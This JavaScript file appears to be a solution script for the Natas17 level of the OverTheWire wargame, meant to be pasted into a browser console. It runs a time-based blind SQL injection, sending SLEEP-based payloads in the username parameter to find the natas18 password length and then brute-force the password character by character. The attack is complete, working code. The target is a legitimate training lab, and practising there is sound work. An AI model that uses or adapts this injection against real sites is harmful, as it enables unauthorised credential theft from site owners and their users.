/**
 * Usage: 
 *  - Navigate to Natas17 page, log in.
 *  - Open a devConsole with F12
 *  - Copy-paste this code into the console and hit enter
 * (It will use the pre-authed session)
 * It will take ~20 seconds to churn through the character combinations
 */
(async function Natas17Brute(){

    const baseUrl = 'http://natas17.natas.labs.overthewire.org/index.php?'

    const SQL_WAIT_TIME = 2

    function createSQL(passwordString){
        return 'debug&username=natas18' + encodeURIComponent(`" AND IF(password LIKE BINARY "${passwordString}", SLEEP(${SQL_WAIT_TIME}),0);#`);
    }

    function testUrl(url){
        return Promise.race([
            fetch(url).then( () => false),    //if we didn't sleep, then it's not correct
            (new Promise(resolve => setTimeout(resolve, (SQL_WAIT_TIME*1000)/2))).then(() => true)    // resolve in half the time it'd take if the thread slept
        ]);    
    }
    
    
    //Get password length:
    let passwordLengthFound =false;
    let passwordLength = 0;
    while ( (!passwordLengthFound) && passwordLength < 100){
        //Send request:
        const requestUrl = baseUrl + createSQL(''.padStart(passwordLength, '_'));

        if (await testUrl(requestUrl)){
            passwordLengthFound = true;
        } else {
            passwordLength++;
        }
    }
    if(passwordLength >= 100){
        throw new Error(`Password length hit the safety margin of 100 and exitted.`);
    }
    
    console.log(`Password found to be ${passwordLength} chars long`);
    
    //Set possible password characters:
    const alphaNum = (new Array(36)).fill(0).map((x,i)=> i.toString(36)).join('');
    const alphaWithCaps = alphaNum + alphaNum.toUpperCase().substr(10);

    //Get password:
    let pass = '';
    for(let i=0; i<passwordLength; i++){
        let charDetermined = false;
        let j=0;
        while (!charDetermined && j < alphaWithCaps.length){
            const passAttempt = `${pass}${alphaWithCaps[j]}`;
            const requestUrl = baseUrl + createSQL(`${passAttempt}%`);
            if (await testUrl(requestUrl)) {
                pass = passAttempt;
                charDetermined = true;
            } else {
                j++;
            }
        }
        console.log(`Cracked up to:\t ${pass.padEnd(passwordLength,'*')}`);
    }
    console.log(`Username: natas18\nPassword: ${pass}`);

})();